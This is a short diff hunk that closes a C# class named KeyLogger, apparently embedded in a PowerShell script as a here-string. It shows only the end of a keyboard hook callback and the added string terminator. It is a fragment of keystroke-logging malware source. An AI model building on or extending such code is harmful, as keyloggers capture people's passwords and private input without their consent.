@@ -65,3 +65,4 @@ public class KeyLogger {
         return CallNextHookEx(hookID, nCode, wParam, lParam);
     }
 }
+"@
